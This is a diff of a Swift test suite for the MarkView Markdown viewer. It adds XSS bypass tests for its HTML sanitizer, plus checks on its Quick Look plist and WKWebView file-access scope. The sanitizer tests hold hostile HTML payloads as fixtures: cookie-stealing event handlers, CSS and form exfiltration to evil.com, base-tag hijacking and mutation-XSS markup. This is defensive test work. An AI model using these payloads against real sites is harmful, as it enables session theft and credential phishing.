@@ -1787,10 +1787,10 @@ runner.test("sanitizer strips script tags") {
 }
 
 runner.test("sanitizer strips event handlers") {
-    let html = "<button onclick=\"alert('click')\">Click</button>"
+    let html = "<div onclick=\"alert('click')\">Click</div>"
     let clean = sanitizer.sanitize(html)
     try expect(!clean.contains("onclick"), "Should strip onclick")
-    try expect(clean.contains("Click"), "Should preserve button text")
+    try expect(clean.contains("Click"), "Should preserve div text")
 }
 
 runner.test("sanitizer blocks javascript URIs") {
@@ -1842,6 +1842,229 @@ runner.test("sanitizer: event-handlers fixture is cleaned") {
     try expect(!clean.contains("onload"), "Should strip onload")
     try expect(!clean.contains("onerror"), "Should strip onerror")
     try expect(clean.contains("Safe content"), "Should preserve safe content")
+}
+
+// =============================================================================
+// XSS Bypass Vector Tests (Security Audit)
+// =============================================================================
+
+print("\n=== XSS Bypass Vector Tests ===")
+
+// --- Vector 1: SVG tags ---
+
+runner.test("sanitizer strips svg onload XSS") {
+    let html = "<p>Safe</p><svg onload=alert(1)></svg><p>After</p>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<svg"), "Should strip svg tags")
+    try expect(!clean.contains("onload"), "Should strip onload handler")
+    try expect(!clean.contains("alert"), "Should strip JS payload")
+    try expect(clean.contains("<p>Safe</p>"), "Should preserve safe content")
+}
+
+runner.test("sanitizer strips svg with nested content") {
+    let html = "<svg><circle r=\"50\"/><animate onbegin=\"alert(1)\"/></svg>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<svg"), "Should strip svg tags")
+    try expect(!clean.contains("animate"), "Should strip svg child elements")
+}
+
+runner.test("sanitizer strips SVG case-insensitive") {
+    let html = "<SVG ONLOAD=alert(1)></SVG>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<SVG"), "Should strip uppercase SVG tags")
+}
+
+// --- Vector 2: Style tag injection ---
+
+runner.test("sanitizer strips style tags with CSS exfiltration") {
+    let html = "<p>Safe</p><style>@import url('https://evil.com/steal?data=secret')</style>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<style"), "Should strip style tags")
+    try expect(!clean.contains("@import"), "Should strip CSS import")
+    try expect(!clean.contains("evil.com"), "Should strip malicious URL")
+    try expect(clean.contains("<p>Safe</p>"), "Should preserve safe content")
+}
+
+runner.test("sanitizer strips style tags with expression") {
+    let html = "<style>body { background: url('https://tracker.com/pixel') }</style>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<style"), "Should strip style tags")
+    try expect(!clean.contains("tracker.com"), "Should strip tracking URL")
+}
+
+runner.test("sanitizer strips STYLE case-insensitive") {
+    let html = "<STYLE>body{color:red}</STYLE>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<STYLE"), "Should strip uppercase STYLE tags")
+}
+
+// --- Vector 3: Unquoted event handlers ---
+
+runner.test("sanitizer strips unquoted onerror") {
+    let html = "<img src=x onerror=alert(1)>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("onerror"), "Should strip unquoted onerror")
+    try expect(!clean.contains("alert"), "Should strip JS payload")
+}
+
+runner.test("sanitizer strips unquoted onload") {
+    let html = "<body onload=alert(1)>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("onload"), "Should strip unquoted onload")
+}
+
+runner.test("sanitizer strips unquoted onmouseover") {
+    let html = "<div onmouseover=alert(document.cookie)>Hover me</div>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("onmouseover"), "Should strip unquoted onmouseover")
+    try expect(!clean.contains("document.cookie"), "Should strip cookie theft payload")
+}
+
+runner.test("sanitizer strips mixed quoted and unquoted handlers") {
+    let html = "<img src=\"valid.png\" onerror=alert(1) onclick=\"steal()\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("onerror"), "Should strip unquoted onerror")
+    try expect(!clean.contains("onclick"), "Should strip quoted onclick")
+    try expect(!clean.contains("alert"), "Should strip JS from unquoted handler")
+    try expect(!clean.contains("steal"), "Should strip JS from quoted handler")
+}
+
+// --- Vector 4: Base tag injection ---
+
+runner.test("sanitizer strips base tag") {
+    let html = "<base href=\"https://evil.com/\"><a href=\"/login\">Login</a>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<base"), "Should strip base tags")
+    try expect(!clean.contains("evil.com"), "Should strip malicious base URL")
+    try expect(clean.contains("<a href=\"/login\">Login</a>"), "Should preserve relative links")
+}
+
+runner.test("sanitizer strips self-closing base tag") {
+    let html = "<base href=\"https://evil.com/\" />"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<base"), "Should strip self-closing base tags")
+}
+
+runner.test("sanitizer strips BASE case-insensitive") {
+    let html = "<BASE HREF=\"https://evil.com/\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<BASE"), "Should strip uppercase BASE tags")
+}
+
+// --- Vector 5: Form/input tag injection (phishing) ---
+
+runner.test("sanitizer strips form tags") {
+    let html = "<form action=\"https://evil.com/steal\"><input type=\"password\" name=\"pw\"><input type=\"submit\" value=\"Login\"></form>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<form"), "Should strip form tags")
+    try expect(!clean.contains("<input"), "Should strip input tags")
+    try expect(!clean.contains("evil.com"), "Should strip malicious action URL")
+}
+
+runner.test("sanitizer strips standalone input tags") {
+    let html = "<p>Enter password:</p><input type=\"password\" name=\"pw\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<input"), "Should strip input tags")
+    try expect(clean.contains("<p>Enter password:</p>"), "Should preserve paragraph")
+}
+
+runner.test("sanitizer strips textarea tags") {
+    let html = "<textarea name=\"data\">Prefilled content</textarea>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<textarea"), "Should strip textarea tags")
+}
+
+runner.test("sanitizer strips button tags") {
+    let html = "<button type=\"submit\">Submit</button>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<button"), "Should strip button tags")
+}
+
+runner.test("sanitizer strips select tags") {
+    let html = "<select name=\"choice\"><option>A</option><option>B</option></select>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<select"), "Should strip select tags")
+}
+
+// --- Vector 6: Link tags ---
+
+runner.test("sanitizer strips link tags") {
+    let html = "<link rel=\"stylesheet\" href=\"https://evil.com/steal.css\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<link"), "Should strip link tags")
+    try expect(!clean.contains("evil.com"), "Should strip malicious stylesheet URL")
+}
+
+runner.test("sanitizer strips link with prefetch") {
+    let html = "<link rel=\"prefetch\" href=\"https://evil.com/track\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<link"), "Should strip prefetch link tags")
+}
+
+runner.test("sanitizer strips LINK case-insensitive") {
+    let html = "<LINK REL=\"stylesheet\" HREF=\"https://evil.com/steal.css\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<LINK"), "Should strip uppercase LINK tags")
+}
+
+// --- Vector 7: data: URI scheme ---
+
+runner.test("sanitizer blocks data URI in href") {
+    let html = "<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("\"data:"), "Should block data: URI")
+    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
+}
+
+runner.test("sanitizer blocks data URI in img src") {
+    let html = "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("\"data:"), "Should block data: URI in img")
+    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
+}
+
+runner.test("sanitizer blocks DATA URI case-insensitive") {
+    let html = "<a href=\"DATA:text/html,<script>alert(1)</script>\">Click</a>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("\"DATA:"), "Should block uppercase DATA: URI")
+    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
+}
+
+// --- Vector 8: Math tags ---
+
+runner.test("sanitizer strips math tags") {
+    let html = "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)></mglyph></mtext></math>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<math"), "Should strip math tags")
+}
+
+runner.test("sanitizer strips MATH case-insensitive") {
+    let html = "<MATH><MTEXT>payload</MTEXT></MATH>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<MATH"), "Should strip uppercase MATH tags")
+}
+
+// --- Combined / edge cases ---
+
+runner.test("sanitizer handles multiple vectors in one payload") {
+    let html = "<svg onload=alert(1)></svg><style>@import url(evil)</style><base href=\"https://evil.com\"><form><input type=password></form><link rel=stylesheet href=evil.css>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<svg"), "Should strip svg")
+    try expect(!clean.contains("<style"), "Should strip style")
+    try expect(!clean.contains("<base"), "Should strip base")
+    try expect(!clean.contains("<form"), "Should strip form")
+    try expect(!clean.contains("<input"), "Should strip input")
+    try expect(!clean.contains("<link"), "Should strip link")
+}
+
+runner.test("sanitizer preserves safe HTML after stripping dangerous content") {
+    let html = "<h1>Title</h1><svg onload=alert(1)></svg><p>Paragraph with <strong>bold</strong> text.</p><style>body{display:none}</style><ul><li>Item</li></ul>"
+    let clean = sanitizer.sanitize(html)
+    try expect(!clean.contains("<svg"), "Should strip svg")
+    try expect(!clean.contains("<style"), "Should strip style")
+    try expect(clean.contains("<h1>Title</h1>"), "Should preserve h1")
+    try expect(clean.contains("<strong>bold</strong>"), "Should preserve strong")
+    try expect(clean.contains("<li>Item</li>"), "Should preserve list items")
 }
 
 // HTML plugin integration
@@ -2755,6 +2978,55 @@ runner.test("Quick Look Info.plist declares principal class") {
         "Info.plist must declare NSExtensionPrincipalClass for macOS to instantiate the provider")
 }
 
+runner.test("Quick Look Info.plist uses module-qualified principal class") {
+    // Swift requires module.ClassName format for macOS to find the class
+    try expect(qlPlist.contains("MarkViewQuickLook.PreviewProvider"),
+        "NSExtensionPrincipalClass must be module-qualified: MarkViewQuickLook.PreviewProvider")
+}
+
+runner.test("Quick Look Info.plist has QLSupportedContentTypes inside NSExtensionAttributes") {
+    // macOS only reads QLSupportedContentTypes from NSExtension > NSExtensionAttributes, not top-level
+    try expect(qlPlist.contains("NSExtensionAttributes"),
+        "Info.plist must have NSExtensionAttributes dict inside NSExtension")
+}
+
+runner.test("Quick Look Info.plist has CFBundleSupportedPlatforms") {
+    try expect(qlPlist.contains("CFBundleSupportedPlatforms"),
+        "Info.plist must declare CFBundleSupportedPlatforms for macOS extension discovery")
+    try expect(qlPlist.contains("MacOSX"),
+        "CFBundleSupportedPlatforms must include MacOSX")
+}
+
+runner.test("Quick Look Info.plist has LSMinimumSystemVersion") {
+    try expect(qlPlist.contains("LSMinimumSystemVersion"),
+        "Info.plist must declare LSMinimumSystemVersion for extension registration")
+}
+
+runner.test("Quick Look Info.plist has QLIsDataBasedPreview") {
+    // Required for data-based QLPreviewProvider extensions to register with pluginkit
+    try expect(qlPlist.contains("QLIsDataBasedPreview"),
+        "Info.plist must declare QLIsDataBasedPreview = true in NSExtensionAttributes")
+}
+
+runner.test("Quick Look Info.plist does not claim public.plain-text") {
+    // public.plain-text conflicts with other QL extensions (Glance, SourceCodeSyntaxHighlight)
+    try expect(!qlPlist.contains("public.plain-text"),
+        "QLSupportedContentTypes must NOT include public.plain-text (causes UTI conflicts)")
+}
+
+runner.test("Quick Look extension calls NSExtensionMain") {
+    // Without NSExtensionMain, macOS can't host the extension as an XPC service
+    try expect(qlSource.contains("NSExtensionMain"),
+        "Extension must call NSExtensionMain() to start the XPC hosting runtime")
+}
+
+runner.test("Quick Look entitlements enable app sandbox") {
+    let entPath = "Sources/MarkViewQuickLook/MarkViewQuickLook.entitlements"
+    let entitlements = (try? String(contentsOfFile: entPath, encoding: .utf8)) ?? ""
+    try expect(entitlements.contains("com.apple.security.app-sandbox"),
+        "Quick Look extension entitlements must enable app sandbox (required by pluginkit)")
+}
+
 runner.test("Quick Look extension returns HTML content type") {
     try expect(qlSource.contains("UTType.html"), "Extension must return HTML content type for QLPreviewReply")
 }
@@ -2994,9 +3266,12 @@ if appBundleExists {
         let plistPath = "\(appexPath)/Contents/Info.plist"
         let plistData = try Data(contentsOf: URL(fileURLWithPath: plistPath))
         let plist = try PropertyListSerialization.propertyList(from: plistData, format: nil) as? [String: Any]
-        let contentTypes = plist?["QLSupportedContentTypes"] as? [String] ?? []
+        // QLSupportedContentTypes lives inside NSExtension > NSExtensionAttributes (not top-level)
+        let nsExtension = plist?["NSExtension"] as? [String: Any]
+        let attrs = nsExtension?["NSExtensionAttributes"] as? [String: Any]
+        let contentTypes = attrs?["QLSupportedContentTypes"] as? [String] ?? []
         try expect(contentTypes.contains("net.daringfireball.markdown"),
-            "QLSupportedContentTypes must include net.daringfireball.markdown")
+            "QLSupportedContentTypes must include net.daringfireball.markdown (inside NSExtensionAttributes)")
     }
 
     runner.test("Quick Look .appex is code-signed") {
@@ -3068,6 +3343,60 @@ runner.test("MarkViewApp uses Window (not WindowGroup) for single-window enforce
     // Check for actual WindowGroup { usage (not just mentions in comments)
     try expect(!source.contains("WindowGroup {"),
         "WindowGroup must not be used — it allows SwiftUI to create duplicate windows")
+}
+
+// =============================================================================
+// MARK: - WKWebView Security Tests
+// =============================================================================
+
+print("")
+print("--- WKWebView Security ---")
+
+runner.test("WebPreviewView does NOT enable allowFileAccessFromFileURLs") {
+    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
+    // Check there is no active (non-commented) line enabling this dangerous preference
+    let lines = source.components(separatedBy: "\n")
+    let activeLines = lines.filter { line in
+        let trimmed = line.trimmingCharacters(in: .whitespaces)
+        return !trimmed.hasPrefix("//") && trimmed.contains("allowFileAccessFromFileURLs")
+    }
+    try expect(activeLines.isEmpty,
+        "allowFileAccessFromFileURLs must NOT be enabled — it allows JS to fetch arbitrary file:// URLs via XSS. Found: \(activeLines)")
+}
+
+runner.test("WebPreviewView does NOT grant read access to root filesystem") {
+    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
+    // Ensure no loadFileURL call passes "/" as the access scope
+    try expect(!source.contains("allowingReadAccessTo: URL(fileURLWithPath: \"/\")"),
+        "allowingReadAccessTo must NOT be root '/' — restricts to narrowest necessary directory")
+}
+
+runner.test("restrictedAccessURL helper exists with correct signature") {
+    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
+    try expect(source.contains("static func restrictedAccessURL(tempFile: URL, baseDirectory: URL?) -> URL"),
+        "restrictedAccessURL helper must exist as a static method")
+    try expect(source.contains("guard let baseDir = baseDirectory else"),
+        "restrictedAccessURL must return tempDir when baseDirectory is nil")
+}
+
+runner.test("restrictedAccessURL computes common ancestor") {
+    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
+    try expect(source.contains("commonComponents"),
+        "restrictedAccessURL must compute the common ancestor of temp and base directories")
+}
+
+runner.test("restrictedAccessURL rejects root as common ancestor") {
+    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
+    try expect(source.contains("commonComponents.count <= 1"),
+        "restrictedAccessURL must reject root '/' as a common ancestor (safety check)")
+}
+
+runner.test("loadViaFileURL uses restrictedAccessURL for access scope") {
+    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
+    try expect(source.contains("Self.restrictedAccessURL(tempFile: tempFile, baseDirectory: baseDirectoryURL)"),
+        "loadViaFileURL must call restrictedAccessURL to compute the access scope")
+    try expect(source.contains("allowingReadAccessTo: accessURL"),
+        "loadFileURL must use the computed accessURL, not a hardcoded path")
 }
 
 // =============================================================================
